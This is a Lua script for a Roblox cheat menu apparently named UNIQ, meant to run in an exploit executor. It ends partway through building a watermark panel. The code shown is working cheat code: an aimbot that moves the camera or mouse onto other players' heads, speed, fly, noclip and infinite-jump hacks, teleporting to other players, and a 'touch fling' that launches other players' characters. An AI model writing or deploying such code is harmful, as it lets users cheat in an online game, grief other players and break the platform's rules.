 Players=game:GetService("Players") local RunService=game:GetService("RunService")
 UserInputService=game:GetService("UserInputService") local TweenService=game:GetService("TweenService")
 CoreGui=game:GetService("CoreGui") local Lighting=game:GetService("Lighting")
 HttpService=game:GetService("HttpService") local TeleportService=game:GetService("TeleportService")
 Camera=workspace.CurrentCamera local player=Players.LocalPlayer local UIS=UserInputService
local autoRA=false do local a,b=pcall(readfile,"uniq_settings.json") if a and b and #b>0 then local c,d=pcall(HttpService.JSONDecode,HttpService,b) if c and type(d)=="table" and typeof(d.autoReattach)=="boolean" then autoRA=d.autoReattach end end end
local prevRun=0 do local a,b=pcall(readfile,"uniq_runtime.json") if a and b and #b>0 then prevRun=tonumber(b) or 0 end end
pcall(writefile,"uniq_runtime.json",tostring(os.time()))
if _G.UniqGen and not autoRA and _G.UniqRespawn and tick()-_G.UniqRespawn<3 then return end
if not _G.UniqGen and not autoRA and prevRun>0 and os.time()-prevRun<60 then return end
if _G.UniqShutdown then pcall(_G.UniqShutdown) _G.UniqShutdown=nil end
_G.UniqGen = (_G.UniqGen or 0) + 1 
 GEN = _G.UniqGen
 SCRIPT_URL = "https://raw.githubusercontent.com/Verticakos/UNIQ/refs/heads/main/UNIQ.lua"
local function httpGet(url) local req=(request or http_request or (syn and syn.request) or (fluxus and fluxus.request)) if req then local ok,r=pcall(req,{Url=url,Method="GET"}) if ok and r and r.Body then return r.Body end end if game.HttpGet then local ok,r=pcall(function() return game:HttpGet(url) end) if ok then return r end end return nil end
 state={walkSpeedEnabled=false,walkSpeedValue=200,flyEnabled=false,flySpeed=300,jumpEnabled=false,jumpHeight=7.2,noJumpCooldown=false,infiniteJump=false,autoJump=false,noRagdoll=false,gravityChanger=false,gravityValue=196.2,noclip=false,visualMaxDistance=500,selectedPlayer=nil,selectedStaff=nil,playerListTagStyle="Display Tags",menuKey=Enum.KeyCode.RightShift,autoReattach=false,antiAFK=true,aimbotEnabled=false,aimbotFov=120,aimbotSmoothX=10,aimbotSmoothY=10,aimbotTargetPart="Head",showFov=false,aimbotKey=nil,aimbotActivation="Hold",aimbotToggled=false,aimMinDist=1,aimMaxDist=500,aimbotIgnoreDead=false,aimbotVisibleOnly=false,ignoreFriend=false,friends={},aimMethod="MouseMoveRel",predictEnabled=false,predictSens=1,namePos=1,distPos=2,tracerPos=2,accents={},live={},conds={},kbinds={},values={},ddrops={}}
local function saveState() local s={} for _,k in ipairs({"autoReattach"}) do s[k]=state[k] end pcall(writefile,"uniq_settings.json",game:GetService("HttpService"):JSONEncode(s)) end
local function saveConfig(nm) local c={} for _,r in ipairs(state.conds) do local v=r.get() if r.bind and r.bind.GetKey() and r.tab=="Player" then v=false end c[r.name]=v end for _,r in ipairs(state.values) do c[r.name]=r.get() end for _,r in ipairs(state.ddrops) do c[r.name]=r.get() end for _,r in ipairs(state.kbinds) do local k=r.get() c[r.name]=typeof(k)=="EnumItem" and tostring(k) or "" end pcall(writefile,"uniq_config_"..nm..".json",game:GetService("HttpService"):JSONEncode(c)) local idx={} local ok,raw=pcall(readfile,"uniq_configs_index.json") if ok and raw and #raw>0 then local ok2,d=pcall(game:GetService("HttpService").JSONDecode,game:GetService("HttpService"),raw) if ok2 and type(d)=="table" then idx=d end end if idx[nm]==nil then idx[nm]=true table.insert(idx,nm) end pcall(writefile,"uniq_configs_index.json",game:GetService("HttpService"):JSONEncode(idx)) end
local function loadConfig(nm) for _,r in ipairs(state.conds) do pcall(r.set,r.def) end for _,r in ipairs(state.values) do pcall(r.set,r.def) end for _,r in ipairs(state.ddrops) do pcall(r.set,r.def) end for _,r in ipairs(state.kbinds) do pcall(r.set,nil) end local ok,raw=pcall(readfile,"uniq_config_"..nm..".json") if ok and raw and #raw>0 then local ok2,d=pcall(game:GetService("HttpService").JSONDecode,game:GetService("HttpService"),raw) if ok2 and d then local function gv(r) local v=d[r.name] if v==nil then v=d[r.bare] end return v end for _,r in ipairs(state.conds) do local v=gv(r) if v~=nil then pcall(r.set,v) end end for _,r in ipairs(state.values) do local v=gv(r) if v~=nil then pcall(r.set,v) end end for _,r in ipairs(state.ddrops) do local v=gv(r) if v~=nil then pcall(r.set,v) end end for _,r in ipairs(state.kbinds) do pcall(r.set,gv(r)) end return true end end return false end
local function listConfigs() local out={} local ok,raw=pcall(readfile,"uniq_configs_index.json") if ok and raw and #raw>0 then local ok2,d=pcall(game:GetService("HttpService").JSONDecode,game:GetService("HttpService"),raw) if ok2 and type(d)=="table" then for _,n in ipairs(d) do if type(n)=="string" and out[n]==nil then local okf,rr=pcall(readfile,"uniq_config_"..n..".json") if okf and rr and #rr>0 then out[n]=n table.insert(out,n) end end end end end local tf={function() return listfiles() end,function() return listfiles("") end,function() return listfiles(".") end,function() return listfiles("workspace") end} for i=1,#tf do local ok2,f=pcall(tf[i]) if ok2 and type(f)=="table" then for _,p in ipairs(f) do if type(p)=="string" then local base=string.match(p,"uniq_config_(.+)%.json$") if base and out[base]==nil then out[base]=base table.insert(out,base) end end end end end return out end
local function resetMenu() for _,r in ipairs(state.conds) do pcall(r.set,r.def) end for _,r in ipairs(state.values) do pcall(r.set,r.def) end for _,r in ipairs(state.ddrops) do pcall(r.set,r.def) end for _,r in ipairs(state.kbinds) do pcall(r.set,nil) end pcall(delfile,"uniq_settings.json") end
local function restoreState() local ok,raw=pcall(readfile,"uniq_settings.json") if ok and raw and #raw>0 then local ok2,d=pcall(game:GetService("HttpService").JSONDecode,game:GetService("HttpService"),raw) if ok2 and d then for _,k in ipairs({"autoReattach"}) do local v=d[k] if typeof(v)=="boolean" then state[k]=v end end end end end restoreState()
local walkConn,noclipConn,flyConn,renderConn,charConn,flyB,flyE,jumpConn,autoJumpConn,aimbotConn,antiAFKConn
local staffA,staffR,visA,visR local flying=false local originalCollision={}
 controls={forward=0,backward=0,left=0,right=0,up=0,down=0}
 flyKeyMap={[Enum.KeyCode.W]="forward",[Enum.KeyCode.S]="backward",[Enum.KeyCode.A]="left",[Enum.KeyCode.D]="right",[Enum.KeyCode.Space]="up",[Enum.KeyCode.LeftControl]="down"}
 baseSpeed=16 local baseJump=7.2
local function applyWalkSpeed() local c=player.Character if not c then return end local h=c:FindFirstChildOfClass("Humanoid") local r=c:FindFirstChild("HumanoidRootPart") if not h or not r then return end h.WalkSpeed=state.walkSpeedEnabled and state.walkSpeedValue or baseSpeed if walkConn then walkConn:Disconnect() walkConn=nil end if state.walkSpeedEnabled and state.walkSpeedValue>baseSpeed then walkConn=RunService.Heartbeat:Connect(function() local c2=player.Character if not c2 or flying or not state.walkSpeedEnabled then return end local h2=c2:FindFirstChildOfClass("Humanoid") local r2=c2:FindFirstChild("HumanoidRootPart") if not h2 or not r2 then return end local md=h2.MoveDirection local target=state.walkSpeedValue if md.Magnitude>0 then r2.AssemblyLinearVelocity=Vector3.new((md*target).X,r2.AssemblyLinearVelocity.Y,(md*target).Z) else local cv=r2.AssemblyLinearVelocity r2.AssemblyLinearVelocity=Vector3.new(cv.X*0.02,cv.Y,cv.Z*0.02) end end) else r.AssemblyLinearVelocity=Vector3.new(0,r.AssemblyLinearVelocity.Y,0) end end
local function applyJump() local c=player.Character if not c then return end local h=c:FindFirstChildOfClass("Humanoid") if not h then return end h.UseJumpPower=false h.JumpHeight=state.jumpEnabled and state.jumpHeight or baseJump end
task.spawn(function() while _G.UniqGen==GEN do task.wait(0.07) local c=player.Character local h=c and c:FindFirstChildOfClass("Humanoid") if h and h.Health>0 then if state.jumpEnabled then applyJump() end if state.infiniteJump and h.FloorMaterial==Enum.Material.Air and UIS:IsKeyDown(Enum.KeyCode.Space) then h:ChangeState(Enum.HumanoidStateType.Jumping) end end end end)
task.spawn(function() local lastNCJ=0 while _G.UniqGen==GEN do task.wait() if state.noJumpCooldown then local c=player.Character local h=c and c:FindFirstChildOfClass("Humanoid") if h and h.Health>0 and h.FloorMaterial~=Enum.Material.Air and UIS:IsKeyDown(Enum.KeyCode.Space) then local now=tick() if now-lastNCJ>0.6 then lastNCJ=now h:ChangeState(Enum.HumanoidStateType.Jumping) end end end end end)
jumpConn = UIS.JumpRequest:Connect(function() 
    if state.infiniteJump and not state._jumpBusy then 
        state._jumpBusy=true
        local h = player.Character and player.Character:FindFirstChildOfClass("Humanoid") 
        if h and h.Health > 0 then 
            h:ChangeState(Enum.HumanoidStateType.Jumping) 
            h.Jump = true 
        end 
        state._jumpBusy=false
    end 
end)
autoJumpConn = RunService.Heartbeat:Connect(function() 
    if state.autoJump then 
        local h = player.Character and player.Character:FindFirstChildOfClass("Humanoid") 
        if h and h.Health > 0 and h.FloorMaterial ~= Enum.Material.Air then 
            h:ChangeState(Enum.HumanoidStateType.Jumping) 
            h.Jump = true 
        end 
    end 
end)
-- AIMBOT
 fovDrawing=Drawing.new("Circle") fovDrawing.Visible=false fovDrawing.Filled=false fovDrawing.Thickness=1 fovDrawing.Color=Color3.fromRGB(19,163,250) fovDrawing.NumSides=64
 T={Window=Color3.fromRGB(17,18,19),Card=Color3.fromRGB(29,30,32),SliderBg=Color3.fromRGB(32,33,35),Rail=Color3.fromRGB(15,16,17),Track=Color3.fromRGB(43,43,43),Stroke=Color3.fromRGB(36,36,36),Accent=Color3.fromRGB(19,163,250),AccentLight=Color3.fromRGB(19,163,250),Text=Color3.fromRGB(235,235,235),ValTxt=Color3.fromRGB(200,200,200),Muted=Color3.fromRGB(155,155,155),KbGrey=Color3.fromRGB(70,70,70)}
local function isAimKeyDown() local k=state.aimbotKey if not k then return false end if typeof(k)=="EnumItem" then if k.EnumType==Enum.KeyCode then return UIS:IsKeyDown(k) elseif k.EnumType==Enum.UserInputType then return UIS:IsMouseButtonPressed(k) end end return false end
aimbotConn=RunService.RenderStepped:Connect(function(dt)
	if state.showFov then fovDrawing.Visible=true fovDrawing.Radius=state.aimbotFov fovDrawing.Position=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2) else fovDrawing.Visible=false end
	if not state.aimbotEnabled then state.aimTarget=nil return end
	local active if state.aimbotActivation=="Toggle" then active=state.aimbotToggled else active=isAimKeyDown() end
	if not active then state.aimTarget=nil return end
	local center=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2)
	local best,bestDist,bestPlr=nil,state.aimbotFov,nil
	for _,plr in ipairs(Players:GetPlayers()) do
		if plr~=player and plr.Character then
			local isFr=state.friends[plr.Name] or state.friends[plr.DisplayName] or state.friends[tostring(plr.UserId)]
			if not (state.aimIgnoreFriend and isFr) then
				local hum=plr.Character:FindFirstChildOfClass("Humanoid")
				if hum and (not state.aimbotIgnoreDead or hum.Health>0) then
					local aimPos=nil
					if state.aimbotTargetPart=="Closest" then
						local bp,bd=nil,math.huge
						for _,n in ipairs({"Head","UpperTorso","Torso"}) do local p=plr.Character:FindFirstChild(n) if p then local sp,on=Camera:WorldToViewportPoint(p.Position) if on then local d=(Vector2.new(sp.X,sp.Y)-center).Magnitude if d<bd then bd=d bp=p.Position end end end end
						aimPos=bp
					elseif state.aimbotTargetPart=="Neck" then
						local h=plr.Character:FindFirstChild("Head") local t=plr.Character:FindFirstChild("UpperTorso") or plr.Character:FindFirstChild("Torso")
						if h and t then aimPos=(h.Position+t.Position)/2 elseif h then aimPos=h.Position end
					elseif state.aimbotTargetPart=="Torso" then
						local p=plr.Character:FindFirstChild("UpperTorso") or plr.Character:FindFirstChild("Torso") or plr.Character:FindFirstChild("HumanoidRootPart")
						if p then aimPos=p.Position end
					else
						local p=plr.Character:FindFirstChild("Head") if p then aimPos=p.Position end
					end
if aimPos then
					local meters=(Camera.CFrame.Position-aimPos).Magnitude*0.28
					if meters>=state.aimMinDist and meters<=state.aimMaxDist then
						local sp,on=Camera:WorldToViewportPoint(aimPos)
						if on then
							local visibleData=not state.aimbotVisibleOnly
							local hitRay
							if not visibleData then
								local rp=RaycastParams.new()
								rp.FilterType=Enum.RaycastFilterType.Exclude
								rp.FilterDescendantsInstances={player.Character}
								hitRay=workspace:Raycast(Camera.CFrame.Position,(aimPos-Camera.CFrame.Position)*1.1,rp)
							end
							if visibleData or not hitRay or hitRay.Instance:IsDescendantOf(plr.Character) then
								local d=(Vector2.new(sp.X,sp.Y)-center).Magnitude
								if d<bestDist then bestDist=d best=aimPos bestPlr=plr end
							end
						end
					end
				end
				end
			end
		end
	end
	if best then state.aimTarget=bestPlr
		if bestPlr and state.predictEnabled and state.predictSens>0 then
			local rp=bestPlr.Character and bestPlr.Character:FindFirstChild("HumanoidRootPart")
			local vel=rp and rp.AssemblyLinearVelocity
			if vel then best=best+vel*math.clamp(state.predictSens,0,1) end
		end
		if state.aimMethod=="Camera" then
			local camPos=Camera.CFrame.Position local cur=Camera.CFrame.LookVector
			local target=(best-camPos).Unit
			local a=1-state.aimbotSmoothX/100 local ax=0.9*a*a*a+0.005 local ay=0.9*((1-state.aimbotSmoothY/100)^3)+0.005
			local mixed=Vector3.new(cur.X+(target.X-cur.X)*ax,cur.Y+(target.Y-cur.Y)*ay,cur.Z+(target.Z-cur.Z)*ax).Unit
			Camera.CFrame=CFrame.new(camPos,camPos+mixed)
		elseif state.aimMethod=="MouseMoveRel" then
			local sp,on=Camera:WorldToViewportPoint(best)
			if on and mousemoverel then
				local dx=sp.X-center.X
				local dy=sp.Y-center.Y
				local a=1-state.aimbotSmoothX/100 local fx=0.9*a*a*a+0.005
				local by=1-state.aimbotSmoothY/100 local fy=0.9*by*by*by+0.005
				local mx=dx*fx
				local my=dy*fy
				if math.abs(dx)>2 then local sg=dx>0 and 1 or -1 mx=math.max(1,math.abs(mx))*sg end
				if math.abs(dy)>2 then local sg=dy>0 and 1 or -1 my=math.max(1,math.abs(my))*sg end
				pcall(mousemoverel,mx,my)
			end
		end
	end
end)
local function applyNoRagdoll(on) local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid") if not h then return end h.BreakJointsOnDeath=not on pcall(function() h:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,not on) end) pcall(function() h:SetStateEnabled(Enum.HumanoidStateType.FallingDown,not on) end) end
task.spawn(function() while _G.UniqGen==GEN do task.wait(0.5) if state.noRagdoll then applyNoRagdoll(true) end end end)
local function cacheCol() local c=player.Character if not c then return end originalCollision={} for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then originalCollision[p]=p.CanCollide end end end
local function updateNC() local c=player.Character if not c then return end for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then if state.noclip then p.CanCollide=false elseif originalCollision[p]~=nil then p.CanCollide=originalCollision[p] end end end end
local function setNoClip(on) state.noclip=on if on then if noclipConn then noclipConn:Disconnect() end noclipConn=RunService.Stepped:Connect(updateNC) updateNC() else if noclipConn then noclipConn:Disconnect() noclipConn=nil end updateNC() end end
local function resetControls() for k in pairs(controls) do controls[k]=0 end end
flyB=UIS.InputBegan:Connect(function(i,g) if g or not flying then return end local k=flyKeyMap[i.KeyCode] if k then controls[k]=1 end end)
flyE=UIS.InputEnded:Connect(function(i) local k=flyKeyMap[i.KeyCode] if k then controls[k]=0 end end)
local function setFly(on)
	local c=player.Character if not c or not c:FindFirstChild("HumanoidRootPart") then return end
	local root=c.HumanoidRootPart local hum=c:FindFirstChildOfClass("Humanoid") if not hum then return end
	flying=on state.flyEnabled=on
	if not on then
		resetControls()
		if flyConn then flyConn:Disconnect() flyConn=nil end
		for _,v in ipairs(root:GetChildren()) do
			if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("BodyPosition") or v:IsA("LinearVelocity") or v:IsA("AngularVelocity") then v:Destroy() end
		end
		for _,p in ipairs(c:GetDescendants()) do
			if p:IsA("BasePart") then p.AssemblyLinearVelocity=Vector3.zero p.AssemblyAngularVelocity=Vector3.zero end
		end
		local look=root.CFrame.LookVector
		local flat=Vector3.new(look.X,0,look.Z)
		if flat.Magnitude<0.01 then flat=Vector3.new(0,0,-1) end
		root.CFrame=CFrame.lookAt(root.Position,root.Position+flat.Unit)
		hum.PlatformStand=false hum.Sit=false hum.AutoRotate=true
		hum:ChangeState(Enum.HumanoidStateType.GettingUp) task.wait()
		root.AssemblyLinearVelocity=Vector3.zero root.AssemblyAngularVelocity=Vector3.zero
		hum:ChangeState(Enum.HumanoidStateType.Freefall) task.wait()
		root.AssemblyAngularVelocity=Vector3.zero
		hum:ChangeState(Enum.HumanoidStateType.Running)
		return
	end
	resetControls() hum:ChangeState(Enum.HumanoidStateType.Physics)
	root.AssemblyLinearVelocity=Vector3.zero root.AssemblyAngularVelocity=Vector3.zero
	hum.PlatformStand=false hum.AutoRotate=false
	if flyConn then flyConn:Disconnect() flyConn=nil end
	flyConn=RunService.Heartbeat:Connect(function()
		if not flying or not player.Character then return end
		local r=player.Character:FindFirstChild("HumanoidRootPart")
		local h=player.Character:FindFirstChildOfClass("Humanoid")
		local cam=workspace.CurrentCamera
		if not r or not h or not cam then return end
		local md=cam.CFrame.LookVector*(controls.forward-controls.backward)+cam.CFrame.RightVector*(controls.right-controls.left)+Vector3.new(0,controls.up-controls.down,0)
		local vel=Vector3.zero
		if md.Magnitude>0 then vel=md.Unit*state.flySpeed end
		h:ChangeState(Enum.HumanoidStateType.Physics)
		r.AssemblyAngularVelocity=Vector3.zero
		r.AssemblyLinearVelocity=vel
	end)
end
-- ONLINE / LOOKUP
local function getSelPlayers() local l={} for _,p in ipairs(Players:GetPlayers()) do if p~=player then table.insert(l,state.playerListTagStyle=="Display Tags" and p.DisplayName or p.Name) end end table.sort(l) return l end
local function findP(name) if not name or name=="None" then return nil end for _,p in ipairs(Players:GetPlayers()) do if p.Name==name or p.DisplayName==name then return p end end return nil end
local function tpToSel() local t=findP(state.selectedPlayer) local tH=t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") local h=player.Character and player.Character:FindFirstChild("HumanoidRootPart") if h and tH then h.CFrame=tH.CFrame+Vector3.new(0,0,3) end end
local function specByName(name) local t=findP(name) local hum=t and t.Character and t.Character:FindFirstChildOfClass("Humanoid") if hum then workspace.CurrentCamera.CameraSubject=hum end end
local function stopSpec() local hum=player.Character and player.Character:FindFirstChildOfClass("Humanoid") if hum then workspace.CurrentCamera.CameraSubject=hum end end
-- ============ TOUCH FLING ============
local function startTouchFlingLoop()
	if state.flingLoopStarted then return end
	state.flingLoopStarted = true
	task.spawn(function()
		local lp = Players.LocalPlayer
		local movel = 0.1
		while _G.UniqGen == GEN do
			RunService.Heartbeat:Wait()
			if state.hiddenFling then
				local c = lp.Character
				local hrp = c and c:FindFirstChild("HumanoidRootPart")
				if c and hrp then
					local vel = hrp.Velocity
					hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
					RunService.RenderStepped:Wait()
					if c.Parent and hrp.Parent then
						hrp.Velocity = vel
					end
					RunService.Stepped:Wait()
					if c.Parent and hrp.Parent then
						hrp.Velocity = vel + Vector3.new(0, movel, 0)
						movel = movel * -1
					end
				end
			end
		end
	end)
end
local function setTouchFling(on)
	state.hiddenFling = on
	if on then
		startTouchFlingLoop()
	end
end
local KS={LeftShift="LShift",RightShift="RShift",LeftControl="LCtrl",RightControl="RCtrl",LeftAlt="LAlt",RightAlt="RAlt",CapsLock="Caps",Return="Enter",Escape="Esc",Space="Space",Backspace="Back",Tab="Tab",ButtonA="A",MouseButton1="M1",MouseButton2="M2",MouseButton3="M3",Unknown=""}
local function shortKey(k) if not k then return "None" end local s=(typeof(k)=="EnumItem") and k.Name or tostring(k) if KS[s] then return KS[s] end if #s>5 then return s:sub(1,5) end return s end
-- ============ KEYBINDS HUD ============
local keybindGui = nil
local keybindConn = nil
local keybindEnabled = false
local keybindRows = {}
local function syncKeybindRow(entry)
	if entry.GetKey() then
		for _,e in ipairs(keybindRows) do if e==entry then return end end
		table.insert(keybindRows, entry)
	else
		for i,e in ipairs(keybindRows) do
			if e==entry then table.remove(keybindRows,i) return end
		end
	end
end
local function setKeybindHud(on)
	keybindEnabled = on
	if keybindConn then
		keybindConn:Disconnect()
		keybindConn = nil
	end
	if keybindGui then
		keybindGui:Destroy()
		keybindGui = nil
	end
	if not on then return end
	keybindGui = Instance.new("ScreenGui")
	keybindGui.Name = "UniqKeybinds"
	keybindGui.ResetOnSpawn = false
	keybindGui.IgnoreGuiInset = true
	keybindGui.Parent = CoreGui
	local frame = Instance.new("Frame")
	frame.Name = "Panel"
	frame.Size = UDim2.new(0, 160, 0, 0)
	frame.AutomaticSize = Enum.AutomaticSize.Y
	frame.Position = UDim2.new(1, -172, 0, 60)
	frame.BackgroundColor3 = Color3.fromRGB(3, 3, 4)
	frame.BackgroundTransparency = 0.2
	frame.BorderSizePixel = 0
	frame.Visible = true
	frame.Parent = keybindGui
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
	local kbDragging=false local kbM0 local kbP0
	frame.InputBegan:Connect(function(i) if frame.Parent and i.UserInputType==Enum.UserInputType.MouseButton1 then kbDragging=true kbM0=i.Position kbP0=frame.Position end end)
	UIS.InputChanged:Connect(function(i) if kbDragging and frame.Parent and i.UserInputType==Enum.UserInputType.MouseMovement then local d=i.Position-kbM0 frame.Position=UDim2.new(kbP0.X.Scale,kbP0.X.Offset+d.X,kbP0.Y.Scale,kbP0.Y.Offset+d.Y) end end)
	UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then kbDragging=false end end)
	local pad = Instance.new("UIPadding")
	pad.PaddingTop = UDim.new(0, 6)
	pad.PaddingBottom = UDim.new(0, 6)
	pad.PaddingLeft = UDim.new(0, 8)
	pad.PaddingRight = UDim.new(0, 8)
	pad.Parent = frame
	Instance.new("UIListLayout", frame).Padding = UDim.new(0, 3)
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, 0, 0, 14)
	title.BackgroundTransparency = 1
	title.Text = "KEYBINDS"
	title.Font = Enum.Font.GothamBold
	title.TextSize = 11
	title.TextColor3 = T.Accent
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = frame
	local function rowText(name, key, on)
		local ac=T.Accent local hx=string.format("#%02X%02X%02X",math.floor(ac.R*255+0.5),math.floor(ac.G*255+0.5),math.floor(ac.B*255+0.5))
		return "<font color='#8A94A6'>" .. name .. "</font>  <b><font color='" .. hx .. "'>" .. string.upper(shortKey(key)) .. "</font></b>  <b><font color='" .. (on and hx or "#9AA5B1") .. "'>" .. (on and "ON" or "OFF") .. "</font></b>"
	end
	local aimLabel = Instance.new("TextLabel")
	aimLabel.Size = UDim2.new(1, 0, 0, 16)
	aimLabel.BackgroundTransparency = 1
	aimLabel.Font = Enum.Font.Gotham
	aimLabel.TextSize = 12
	aimLabel.TextXAlignment = Enum.TextXAlignment.Left
	aimLabel.RichText = true
	aimLabel.Text = ""
	aimLabel.Parent = frame
	local emptyLabel = Instance.new("TextLabel")
	emptyLabel.Size = UDim2.new(1, 0, 0, 16)
	emptyLabel.BackgroundTransparency = 1
	emptyLabel.Font = Enum.Font.Gotham
	emptyLabel.TextSize = 12
	emptyLabel.TextXAlignment = Enum.TextXAlignment.Left
	emptyLabel.Text = "No keybinds added"
	emptyLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
	emptyLabel.Visible = false
	emptyLabel.Parent = frame
	local rowLabels = {}
	keybindConn = RunService.RenderStepped:Connect(function()
		if not keybindEnabled or not frame.Parent then return end
		if state.aimbotKey then
			local active = false
			if state.aimbotEnabled then
				if state.aimbotActivation == "Toggle" then
					active = state.aimbotToggled == true
				else
					active = isAimKeyDown()
				end
			end
			aimLabel.Text = rowText("Aim", state.aimbotKey, active)
		end
		aimLabel.Visible = state.aimbotKey ~= nil
		local rowCount = 0
		local alive = {}
		for _, entry in ipairs(keybindRows) do
			rowCount += 1
			alive[entry] = true
			local label = rowLabels[entry]
			if not label then
				label = Instance.new("TextLabel")
				label.Size = UDim2.new(1, 0, 0, 16)
				label.BackgroundTransparency = 1
				label.Font = Enum.Font.Gotham
				label.TextSize = 12
				label.TextXAlignment = Enum.TextXAlignment.Left
				label.RichText = true
				label.Parent = frame
				rowLabels[entry] = label
			end
			label.Text = rowText(entry.Name, entry.GetKey(), entry.GetState())
		end
		for entry, label in pairs(rowLabels) do
			if not alive[entry] then
				label:Destroy()
				rowLabels[entry] = nil
			end
		end
		emptyLabel.Visible = not aimLabel.Visible and rowCount == 0
	end)
end
-- ============ FRIEND LIST HUD ============
local friendGui = nil
local friendConn = nil
local friendEnabled = false
local function isFriendOf(p) return state.friends[p.Name] or state.friends[p.DisplayName] or state.friends[tostring(p.UserId)] end
local function setFriendHud(on)
	friendEnabled = on
	if friendConn then
		friendConn:Disconnect()
		friendConn = nil
	end
	if friendGui then
		friendGui:Destroy()
		friendGui = nil
	end
	if not on then return end
	friendGui = Instance.new("ScreenGui")
	friendGui.Name = "UniqFriends"
	friendGui.ResetOnSpawn = false
	friendGui.IgnoreGuiInset = true
	friendGui.Parent = CoreGui
	local frame = Instance.new("Frame")
	frame.Name = "Panel"
	frame.Size = UDim2.new(0, 160, 0, 0)
	frame.AutomaticSize = Enum.AutomaticSize.Y
	frame.Position = UDim2.new(1, -172, 0, 176)
	frame.BackgroundColor3 = Color3.fromRGB(3, 3, 4)
	frame.BackgroundTransparency = 0.2
	frame.BorderSizePixel = 0
	frame.Visible = true
	frame.Parent = friendGui
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
	local frDragging=false local frM0 local frP0
	frame.InputBegan:Connect(function(i) if frame.Parent and i.UserInputType==Enum.UserInputType.MouseButton1 then frDragging=true frM0=i.Position frP0=frame.Position end end)
	UIS.InputChanged:Connect(function(i) if frDragging and frame.Parent and i.UserInputType==Enum.UserInputType.MouseMovement then local d=i.Position-frM0 frame.Position=UDim2.new(frP0.X.Scale,frP0.X.Offset+d.X,frP0.Y.Scale,frP0.Y.Offset+d.Y) end end)
	UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then frDragging=false end end)
	local pad = Instance.new("UIPadding")
	pad.PaddingTop = UDim.new(0, 6)
	pad.PaddingBottom = UDim.new(0, 6)
	pad.PaddingLeft = UDim.new(0, 8)
	pad.PaddingRight = UDim.new(0, 8)
	pad.Parent = frame
	Instance.new("UIListLayout", frame).Padding = UDim.new(0, 3)
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, 0, 0, 14)
	title.BackgroundTransparency = 1
	title.Text = "FRIENDS"
	title.Font = Enum.Font.GothamBold
	title.TextSize = 11
	title.TextColor3 = T.Accent
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = frame
	local emptyLabel = Instance.new("TextLabel")
	emptyLabel.Size = UDim2.new(1, 0, 0, 16)
	emptyLabel.BackgroundTransparency = 1
	emptyLabel.Font = Enum.Font.Gotham
	emptyLabel.TextSize = 12
	emptyLabel.TextXAlignment = Enum.TextXAlignment.Left
	emptyLabel.Text = "No friends added"
	emptyLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
	emptyLabel.Visible = false
	emptyLabel.Parent = frame
	local friendRows = {}
	friendConn = RunService.RenderStepped:Connect(function()
		if not friendEnabled or not frame.Parent then return end
		local alive = {}
		local count = 0
		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= player and isFriendOf(p) then
				count += 1
				alive[p] = true
				local label = friendRows[p]
				if not label then
					label = Instance.new("TextLabel")
					label.Size = UDim2.new(1, 0, 0, 16)
					label.BackgroundTransparency = 1
					label.Font = Enum.Font.Gotham
					label.TextSize = 12
					label.TextXAlignment = Enum.TextXAlignment.Left
					label.Parent = frame
					friendRows[p] = label
				end
				local ac=T.Accent local hx=string.format("#%02X%02X%02X",math.floor(ac.R*255+0.5),math.floor(ac.G*255+0.5),math.floor(ac.B*255+0.5))
				label.Text = "<font color='" .. hx .. "'>" .. (p.DisplayName and p.DisplayName ~= p.Name and p.DisplayName or p.Name) .. "</font>"
				label.RichText = true
			end
		end
		for p, label in pairs(friendRows) do
			if not alive[p] then
				label:Destroy()
				friendRows[p] = nil
			end
		end
		emptyLabel.Visible = count == 0
	end)
end
-- ============ WATERMARK ============
local watermarkGui = nil
local watermarkConn = nil
local fpsTween = nil
local function setWatermark(on)
	if watermarkConn then
		watermarkConn:Disconnect()
		watermarkConn = nil
	end
	if fpsTween then
		fpsTween:Cancel()
		fpsTween = nil
	end
	if watermarkGui then
		watermarkGui:Destroy()
		watermarkGui = nil
	end
	if not on then return end
	watermarkGui = Instance.new("ScreenGui")
	watermarkGui.Name = "UniqWatermark"
	watermarkGui.ResetOnSpawn = false
	watermarkGui.IgnoreGuiInset = true
	watermarkGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	watermarkGui.Parent = CoreGui
	-- pill
	local pill = Instance.new("Frame")
	pill.Name = "Pill"
	pill.Size = UDim2.new(0, 170, 0, 44)
	pill.Position = UDim2.new(0.5, -85, 0, 12)
	pill.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
	pill.BackgroundTransparency = 1 -- start invisible
	pill.BorderSizePixel = 0
	pill.ClipsDescendants = false
	pill.Parent = watermarkGui
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(1, 0)
	corner.Parent = pill
	-- logo 
	local logo = Instance.new("ImageLabel")
	logo.Size = UDim2.new(0, 79, 0, 79)
	logo.Position = UDim2.new(0, 8, 0.5, -40.5)
	logo.BackgroundTransparency = 1
	logo.Image = "rbxassetid://136920670703042"
	logo.ImageTransparency = 1 -- start invisible
	logo.ScaleType = Enum.ScaleType.Fit
	logo.ZIndex = 2
	Instance.new("UICorner", logo).CornerRadius = UDim.new(0, 12)
	logo.Parent = pill
	-- FPS
	local fpsLabel = Instance.new("TextLabel")
	fpsLabel.Size = UDim2.new(1, -92, 0.5, 0)
	fpsLabel.Position = UDim2.new(0, 92, 0, 1)
	fpsLabel.BackgroundTransparency = 1
	fpsLabel.Text = "FPS: 60"
